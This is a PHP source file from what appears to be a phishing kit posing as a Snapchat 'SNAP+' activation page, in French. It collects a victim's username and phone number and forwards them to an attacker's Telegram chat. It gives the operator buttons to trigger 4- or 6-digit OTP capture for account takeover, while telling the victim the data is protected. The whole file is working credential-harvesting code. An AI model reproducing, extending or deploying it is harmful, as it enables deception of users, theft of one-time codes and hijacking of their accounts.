<?php

declare(strict_types=1);

require __DIR__ . '/includes/bootstrap.php';

session_start();

$flowId = isset($_SESSION['flow_id']) ? (string) $_SESSION['flow_id'] : '';
$secret = isset($_SESSION['flow_secret']) ? (string) $_SESSION['flow_secret'] : '';
$flow = ($flowId !== '' && $secret !== '') ? app_flow_read($flowId) : null;

if ($flow === null || $flow['secret'] !== $secret) {
    header('Location: index.php', true, 302);
    exit;
}

$pseudo = $flow['pseudo'];
$display = '@' . ltrim($pseudo, '@');
$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = isset($_POST['phone']) ? trim((string) $_POST['phone']) : '';
    if ($phone === '') {
        $error = 'Veuillez entrer votre numéro de téléphone.';
    } elseif (!app_telegram_configured()) {
        $error = 'Configuration Telegram incomplète.';
    } else {
        $base = app_public_base_url();
        if (!str_starts_with($base, 'https://')) {
            $error = 'Les boutons Telegram nécessitent une URL HTTPS. Renseignez site_base_url dans config.php (ex. https://votredomaine.com).';
        }
        if ($error === '') {
            $q = static function (string $s): string {
                return rawurlencode($s);
            };
            $url4 = $base . '/otp.php?f=' . $q($flowId) . '&s=' . $q($secret) . '&d=4';
            $url6 = $base . '/otp.php?f=' . $q($flowId) . '&s=' . $q($secret) . '&d=6';

            $text = "Téléphone reçu\nPseudo : " . $pseudo . "\nNuméro : " . $phone;
            $body = [
                'chat_id' => $config['telegram_chat_id'],
                'text' => $text,
                'reply_markup' => [
                    'inline_keyboard' => [
                        [
                            ['text' => 'OTP 4 chiffres', 'url' => $url4],
                            ['text' => 'OTP 6 chiffres', 'url' => $url6],
                        ],
                    ],
                ],
            ];
            $r = app_telegram_send($body);
            if (!$r['ok']) {
                $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
            } else {
                $flow['phone'] = $phone;
                app_flow_write($flowId, $flow);
                $success = 'Numéro enregistré. Ouvrez le message Telegram pour choisir le type de code.';
            }
        }
    }
}

$css = require __DIR__ . '/includes/snap_styles.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Numéro — Snap+</title>
    <style><?= $css ?></style>
</head>
<body>
    <div class="card">
        <div class="logo-wrap" aria-hidden="true">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <path fill="#fff" stroke="#000" stroke-width="3" d="M50 8 C28 8 12 28 12 48 c0 8 3 16 8 22 C12 78 8 88 8 92 h84 c0-4-4-14-12-22 5-6 8-14 8-22 C88 28 72 8 50 8z M38 58 c4 6 10 10 12 10 s8-4 12-10"/>
            </svg>
        </div>
        <div class="badge">SNAP+</div>
        <p class="pseudo-chip"><?= htmlspecialchars($display, ENT_QUOTES, 'UTF-8') ?></p>
        <p class="intro">Pour activer votre offre SNAP+, veuillez renseigner votre numéro de téléphone.</p>

        <?php if ($error !== '') : ?>
            <div class="alert alert-error" role="alert"><?= $error ?></div>
        <?php endif; ?>
        <?php if ($success !== '') : ?>
            <div class="alert alert-success" role="status"><?= htmlspecialchars($success, ENT_QUOTES, 'UTF-8') ?></div>
        <?php endif; ?>

        <form method="post" action="">
            <label for="phone">Téléphone</label>
            <input
                type="tel"
                id="phone"
                name="phone"
                placeholder="06 12 34 56 78"
                value="<?= isset($_POST['phone']) ? htmlspecialchars((string) $_POST['phone'], ENT_QUOTES, 'UTF-8') : '' ?>"
                autocomplete="tel"
                inputmode="tel"
                maxlength="32"
            >
            <button type="submit" class="btn btn-primary">CONTINUER</button>
        </form>

        <div class="footer-secure">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="#FF9800" aria-hidden="true">
                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <span>Vos données sont protégées</span>
        </div>
    </div>
</body>
</html>
